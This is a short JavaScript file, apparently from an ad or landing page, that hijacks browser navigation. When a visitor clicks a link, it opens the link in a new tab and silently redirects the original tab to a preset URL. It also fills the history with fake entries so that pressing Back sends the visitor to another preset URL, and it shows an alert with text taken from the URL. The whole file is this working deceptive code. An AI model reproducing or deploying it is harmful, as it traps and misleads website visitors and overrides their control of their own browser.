if (typeof under !== "undefined" && under !== null) {
    if (typeof cta !== "undefined" && cta !== null) {
        document.addEventListener('click', function(event) {
            var target = event.target;
            while (target) {
                if (target.tagName === 'A' && target.classList.contains(cta)) {
                    const linkHref = target.href;
                    event.preventDefault();
                    window.open(linkHref, '_blank');
                    window.location.replace(under);
                    break;
                }
                target = target.parentNode;
            }
        });
    } else {
        document.addEventListener('click', function(event) {
            var target = event.target;
            while (target) {
                if (target.tagName === 'A') {
                    const linkHref = target.href;
                    event.preventDefault();
                    window.open(linkHref, '_blank');
                    window.location.replace(under);
                    break;
                }
                target = target.parentNode;
            }
        });
    }
}
if (typeof back !== "undefined" && back !== null) {
    !(function() {
        var t;
        try {
            const URL = window.location.href.split(/[#]/)[0];
            for (t = 0; 10 > t; ++t) history.pushState({}, '', URL + '#');
            onpopstate = function(event) {
                event.state && location.replace(back);
            };
        } catch (o) {
            console.log(o);
        }
    })();
}

function getURLParameter_location(e) {
    return decodeURI((RegExp(e + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
}

function getURLParameter_hash(e) {
    return decodeURI((RegExp(e + "=(.+?)(&|$)").exec(location.hash) || [, null])[1] || "")
}

function getURLParameter(e) {
    var a = null;
    return getURLParameter_hash(e) ? getURLParameter_hash(e) : getURLParameter_location(e)
}
if (getURLParameter('alert')) {
    setTimeout(function() {
        alert(getURLParameter('alert'))
    }, 500);
}